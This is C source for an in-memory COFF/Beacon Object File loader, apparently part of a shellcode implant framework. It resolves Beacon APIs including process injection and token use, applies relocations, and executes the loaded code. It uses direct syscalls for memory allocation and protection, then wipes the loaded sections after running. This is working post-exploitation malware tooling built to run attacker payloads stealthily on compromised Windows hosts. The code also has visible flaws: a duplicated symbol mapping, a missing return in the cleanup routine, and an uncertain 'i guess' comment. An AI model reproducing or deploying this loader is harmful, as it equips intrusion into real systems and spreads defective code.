
#include <CoffeeLdr.h>

FUNC PVOID CoffeeProcessSymbol(LPSTR Symbol)
{
    STARDUST_INSTANCE

    COFFAPIFUNC BeaconApi[BEACON_API_COUNT] = {
        {.NameHash = COFFAPI_BEACONDATAPARSER, .Pointer = BeaconDataParse},
        {.NameHash = COFFAPI_BEACONDATAINT, .Pointer = BeaconDataInt},
        {.NameHash = COFFAPI_BEACONDATASHORT, .Pointer = BeaconDataShort},
        {.NameHash = COFFAPI_BEACONDATALENGTH, .Pointer = BeaconDataLength},
        {.NameHash = COFFAPI_BEACONDATAEXTRACT, .Pointer = BeaconDataExtract},
        {.NameHash = COFFAPI_BEACONFORMATALLOC, .Pointer = BeaconFormatAlloc},
        {.NameHash = COFFAPI_BEACONFORMATRESET, .Pointer = BeaconFormatReset},
        {.NameHash = COFFAPI_BEACONFORMATFREE, .Pointer = BeaconFormatFree},
        {.NameHash = COFFAPI_BEACONFORMATAPPEND, .Pointer = BeaconFormatAppend},
        {.NameHash = COFFAPI_BEACONFORMATPRINTF, .Pointer = BeaconFormatPrintf},
        {.NameHash = COFFAPI_BEACONFORMATTOSTRING, .Pointer = BeaconFormatToString},
        {.NameHash = COFFAPI_BEACONFORMATINT, .Pointer = BeaconFormatInt},
        {.NameHash = COFFAPI_BEACONPRINTF, .Pointer = BeaconPrintf},
        {.NameHash = COFFAPI_BEACONOUTPUT, .Pointer = BeaconOutput},
        {.NameHash = COFFAPI_BEACONUSETOKEN, .Pointer = BeaconUseToken},
        {.NameHash = COFFAPI_BEACONREVERTTOKEN, .Pointer = BeaconRevertToken},
        {.NameHash = COFFAPI_BEACONISADMIN, .Pointer = BeaconIsAdmin},
        {.NameHash = COFFAPI_BEACONGETSPAWNTO, .Pointer = BeaconGetSpawnTo},
        {.NameHash = COFFAPI_BEACONINJECTPROCESS, .Pointer = BeaconInjectProcess},
        {.NameHash = COFFAPI_BEACONINJECTTEMPORARYPROCESS, .Pointer = BeaconInjectTemporaryProcess},
        {.NameHash = COFFAPI_BEACONCLEANUPPROCESS, .Pointer = BeaconCleanupProcess},
        {.NameHash = COFFAPI_BEACONDATAPARSER, .Pointer = toWideChar},
        {.NameHash = COFFAPI_LOADLIBRARYA, .Pointer = LdrModuleLoad},
        {.NameHash = COFFAPI_GETPROCADDRESS, .Pointer = LdrFunctionString},
        {.NameHash = COFFAPI_FREELIBRARY, .Pointer = Instance()->Win32.FreeLibrary},
    };

    CHAR Bak[1024] = {0};
    PVOID FuncAddr = NULL;
    PCHAR SymLibrary = NULL;
    PCHAR SymFunction = NULL;
    HMODULE hLibrary = NULL;
    DWORD SymHash = HashString(Symbol + COFF_PREP_SYMBOL_SIZE, 0);
    DWORD SymBeacon = HashString(Symbol, COFF_PREP_BEACON_SIZE);

    MmCopy(Bak, Symbol, StringLengthA(Symbol) + 1);

    if (
        SymBeacon == COFF_PREP_BEACON || // check if this is a Beacon api
        SymHash == COFFAPI_TOWIDECHAR ||
        SymHash == COFFAPI_GETPROCADDRESS ||
        SymHash == COFFAPI_LOADLIBRARYA ||
        SymHash == COFFAPI_GETMODULEHANDLE ||
        SymHash == COFFAPI_FREELIBRARY)
    {
        SymFunction = Symbol + COFF_PREP_SYMBOL_SIZE;
        if (HashString(SymFunction, 0) == COFFAPI_FREELIBRARY)
        {
            return Instance()->Win32.FreeLibrary;
        }

        for (DWORD i = 0; i < BEACON_API_COUNT; i++)
        {
            if (HashString(SymFunction, 0) == BeaconApi[i].NameHash)
                return Instance()->Base.Buffer + (UINT_PTR)BeaconApi[i].Pointer; // BeaconApi[i].Pointer is offset from shc base i guess
        }
    }
    else if (HashString(Symbol, COFF_PREP_SYMBOL_SIZE) == COFF_PREP_SYMBOL)
    {
        SymLibrary = Bak + COFF_PREP_SYMBOL_SIZE;
        PCHAR *toks = StringTokenA(SymLibrary, "$");
        SymLibrary = toks[0];
        SymFunction = toks[1];

        hLibrary = LdrModuleLoad(SymLibrary);
        FuncAddr = LdrFunctionString(hLibrary, SymFunction);
    }
    else
    {
        return FALSE;
    }

    if (!FuncAddr)
    {
        Instance()->Win32.printf("found a null at %s", Symbol + COFF_PREP_SYMBOL_SIZE);
        return NULL;
    }

    return FuncAddr;
}

FUNC BOOL CoffeeExecuteFunction(PCOFFEE Coffee, PCHAR Function, PVOID Argument, SIZE_T Size)
{
    STARDUST_INSTANCE

    typedef VOID (*COFFEEMAIN)(PCHAR, ULONG);

    COFFEEMAIN CoffeeMain = NULL;
    DWORD OldProtection = 0;
    BOOL Success = FALSE;

    for (DWORD SymCounter = 0; SymCounter < Coffee->Header->NumberOfSymbols; SymCounter++)
    {
        if (StringCompareA(Coffee->Symbol[SymCounter].First.Name, Function) == 0)
        {
            Success = TRUE;
            // set the .text section to RX
            // BOOL __stdcall VirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect)
            Instance()->Win32.VirtualProtect(Coffee->SecMap[Coffee->Symbol[SymCounter].SectionNumber - 1].Ptr, Coffee->SecMap[Coffee->Symbol[SymCounter].SectionNumber - 1].Size, PAGE_EXECUTE_READ, &OldProtection);
            // SysNtProtectVirtualMemory(NtCurrentProcess(), &Coffee->SecMap[Coffee->Symbol[SymCounter].SectionNumber - 1].Ptr, &Coffee->SecMap[Coffee->Symbol[SymCounter].SectionNumber - 1].Size, PAGE_EXECUTE_READ, &OldProtection);
            CoffeeMain = (COFFEEMAIN)(Coffee->SecMap[Coffee->Symbol[SymCounter].SectionNumber - 1].Ptr + Coffee->Symbol[SymCounter].Value);

            CoffeeMain(Argument, Size);
        }
    }

    return Success;
}

FUNC BOOL CoffeeCleanup(PCOFFEE Coffee)
{
    STARDUST_INSTANCE

    DWORD OldProtection = 0;

    for (DWORD SecCnt = 0; SecCnt < Coffee->Header->NumberOfSections; SecCnt++)
    {
        if (Coffee->SecMap[SecCnt].Ptr && Coffee->SecMap[SecCnt].Size)
        {

            if (!NT_SUCCESS(SysNtProtectVirtualMemory(NtCurrentProcess(), (PPVOID)&Coffee->SecMap[SecCnt].Ptr, &Coffee->SecMap[SecCnt].Size, PAGE_READWRITE, NULL)))
            {
                return FALSE;
            }

            MmZero(Coffee->SecMap[SecCnt].Ptr, Coffee->SecMap[SecCnt].Size);

            Instance()->Win32.VirtualFree(Coffee->SecMap[SecCnt].Ptr, 0, MEM_RELEASE);

            Coffee->SecMap[SecCnt].Ptr = NULL;
        }
    }

    if (Coffee->SecMap)
    {
        MmZero(Coffee->SecMap, Coffee->Header->NumberOfSections * sizeof(SECTION_MAP));
        Instance()->Win32.LocalFree(Coffee->SecMap);
        Coffee->SecMap = NULL;
    }

    if (Coffee->FunMap)
    {
        MmZero(Coffee->FunMap, 2048);
        Instance()->Win32.VirtualFree(Coffee->FunMap, 0, MEM_RELEASE);
        Coffee->FunMap = NULL;
    }
}

FUNC BOOL CoffeeProcessSections(PCOFFEE Coffee)
{
    STARDUST_INSTANCE

    UINT32 Symbol = 0;
    PVOID SymString = NULL;
    PCHAR FuncPtr = NULL;
    DWORD FuncCount = 0;
    UINT64 OffsetLong = 0;
    UINT32 Offset = 0;

    for (DWORD SectionCnt = 0; SectionCnt < Coffee->Header->NumberOfSections; SectionCnt++)
    {
        Coffee->Section = U_PTR(Coffee->Data) + sizeof(COFF_FILE_HEADER) + U_PTR(sizeof(COFF_SECTION) * SectionCnt);
        Coffee->Reloc = U_PTR(Coffee->Data) + Coffee->Section->PointerToRelocations;

        for (DWORD RelocCnt = 0; RelocCnt < Coffee->Section->NumberOfRelocations; RelocCnt++)
        {
            if (Coffee->Symbol[Coffee->Reloc->SymbolTableIndex].First.Name[0] != 0)
            {
                Symbol = C_PTR(Coffee->Symbol[Coffee->Reloc->SymbolTableIndex].First.Value[1]);

                if (Coffee->Reloc->Type == IMAGE_REL_AMD64_ADDR64)
                {
                    MmCopy(&OffsetLong, Coffee->SecMap[SectionCnt].Ptr + Coffee->Reloc->VirtualAddress, sizeof(UINT64));

                    OffsetLong = (UINT64)(Coffee->SecMap[Coffee->Symbol[Coffee->Reloc->SymbolTableIndex].SectionNumber - 1].Ptr + (UINT64)OffsetLong);

                    MmCopy(Coffee->SecMap[SectionCnt].Ptr + Coffee->Reloc->VirtualAddress, &OffsetLong, sizeof(UINT64));
                }
                else if (Coffee->Reloc->Type == IMAGE_REL_AMD64_ADDR32NB)
                {
                    MmCopy(&Offset, Coffee->SecMap[SectionCnt].Ptr + Coffee->Reloc->VirtualAddress, sizeof(UINT32));

                    if (((PCHAR)(Coffee->SecMap[Coffee->Symbol[Coffee->Reloc->SymbolTableIndex].SectionNumber - 1].Ptr + Offset) - (PCHAR)(Coffee->SecMap[SectionCnt].Ptr + Coffee->Reloc->VirtualAddress + 4)) > 0xffffffff)
                        return FALSE;

                    Offset = (UINT32)((PCHAR)(Coffee->SecMap[Coffee->Symbol[Coffee->Reloc->SymbolTableIndex].SectionNumber - 1].Ptr + Offset) - (PCHAR)(Coffee->SecMap[SectionCnt].Ptr + Coffee->Reloc->VirtualAddress + 4));

                    MmCopy(Coffee->SecMap[SectionCnt].Ptr + Coffee->Reloc->VirtualAddress, &Offset, sizeof(UINT32));
                }
                else if (IMAGE_REL_AMD64_REL32 <= Coffee->Reloc->Type && Coffee->Reloc->Type <= IMAGE_REL_AMD64_REL32_5)
                {
                    MmCopy(&Offset, Coffee->SecMap[SectionCnt].Ptr + Coffee->Reloc->VirtualAddress, sizeof(UINT32));

                    if ((Coffee->SecMap[Coffee->Symbol[Coffee->Reloc->SymbolTableIndex].SectionNumber - 1].Ptr - (Coffee->SecMap[SectionCnt].Ptr + Coffee->Reloc->VirtualAddress + 4)) > 0xffffffff)
                        return FALSE;

                    Offset += (UINT32)(Coffee->SecMap[Coffee->Symbol[Coffee->Reloc->SymbolTableIndex].SectionNumber - 1].Ptr - (Coffee->Reloc->Type - 4) - (Coffee->SecMap[SectionCnt].Ptr + Coffee->Reloc->VirtualAddress + 4));

                    MmCopy(Coffee->SecMap[SectionCnt].Ptr + Coffee->Reloc->VirtualAddress, &Offset, sizeof(UINT32));
                }
            }
            else
            {
                Symbol = Coffee->Symbol[Coffee->Reloc->SymbolTableIndex].First.Value[1];
                SymString = ((PCHAR)(Coffee->Symbol + Coffee->Header->NumberOfSymbols)) + Symbol;
                FuncPtr = CoffeeProcessSymbol(SymString);

                if (!FuncPtr)
                {
                    return FALSE;
                }

                if (Coffee->Reloc->Type == IMAGE_REL_AMD64_REL32 && FuncPtr != NULL)
                {
                    if (((Coffee->FunMap + (FuncCount * 8)) - (Coffee->SecMap[SectionCnt].Ptr + Coffee->Reloc->VirtualAddress + 4)) > 0xffffffff)
                        return FALSE;

                    MmCopy(Coffee->FunMap + (FuncCount * 8), &FuncPtr, sizeof(UINT64));
                    Offset = (UINT32)((Coffee->FunMap + (FuncCount * 8)) - (Coffee->SecMap[SectionCnt].Ptr + Coffee->Reloc->VirtualAddress + 4));

                    MmCopy(Coffee->SecMap[SectionCnt].Ptr + Coffee->Reloc->VirtualAddress, &Offset, sizeof(UINT32));
                    FuncCount++;
                }
                else if (Coffee->Reloc->Type == IMAGE_REL_AMD64_REL32)
                {
                    MmCopy(&Offset, Coffee->SecMap[SectionCnt].Ptr + Coffee->Reloc->VirtualAddress, sizeof(UINT32));

                    if ((Coffee->SecMap[Coffee->Symbol[Coffee->Reloc->SymbolTableIndex].SectionNumber - 1].Ptr - (Coffee->SecMap[SectionCnt].Ptr + Coffee->Reloc->VirtualAddress + 4)) > 0xffffffff)
                        return FALSE;

                    Offset += (UINT32)(Coffee->SecMap[Coffee->Symbol[Coffee->Reloc->SymbolTableIndex].SectionNumber - 1].Ptr - (Coffee->SecMap[SectionCnt].Ptr + Coffee->Reloc->VirtualAddress + 4));

                    MmCopy(Coffee->SecMap[SectionCnt].Ptr + Coffee->Reloc->VirtualAddress, &Offset, sizeof(UINT32));
                }
            }

            Coffee->Reloc = U_PTR(Coffee->Reloc) + sizeof(COFF_RELOC);
        }
    }

    return TRUE;
}

FUNC void CoffeeLdr(PCHAR EntryName, PVOID CoffeeData, PVOID ArgData, SIZE_T ArgSize)
{
    STARDUST_INSTANCE
    COFFEE Coffee = {0};

    if (!CoffeeData)
    {
        return;
    }

    Coffee.Data = CoffeeData;
    Coffee.Header = Coffee.Data;

    SIZE_T secMapSize = Coffee.Header->NumberOfSections * sizeof(SECTION_MAP);
    SysNtAllocateVirtualMemory(
        NtCurrentProcess(),
        &Coffee.SecMap,
        0,
        &secMapSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE);

    SIZE_T funMapSize = 2048;
    SysNtAllocateVirtualMemory(
        NtCurrentProcess(),
        &Coffee.FunMap,
        0,
        &funMapSize,
        MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN,
        PAGE_READWRITE);

    for (DWORD SecCnt = 0; SecCnt < Coffee.Header->NumberOfSections; SecCnt++)
    {
        Coffee.Section = U_PTR(Coffee.Data) + sizeof(COFF_FILE_HEADER) + U_PTR(sizeof(COFF_SECTION) * SecCnt);
        Coffee.SecMap[SecCnt].Size = Coffee.Section->SizeOfRawData;

        SIZE_T secSize = Coffee.SecMap[SecCnt].Size;
        SysNtAllocateVirtualMemory(
            NtCurrentProcess(),
            &Coffee.SecMap[SecCnt].Ptr,
            0,
            &secSize,
            MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN,
            PAGE_READWRITE);

        MmCopy(Coffee.SecMap[SecCnt].Ptr, U_PTR(CoffeeData) + Coffee.Section->PointerToRawData,
               Coffee.Section->SizeOfRawData);
    }

    Coffee.Symbol = Coffee.Header->PointerToSymbolTable + U_PTR(Coffee.Data);
    if (!CoffeeProcessSections(&Coffee))
    {
        return;
    }

    CoffeeExecuteFunction(&Coffee, EntryName, ArgData, ArgSize);
    CoffeeCleanup(&Coffee);
}
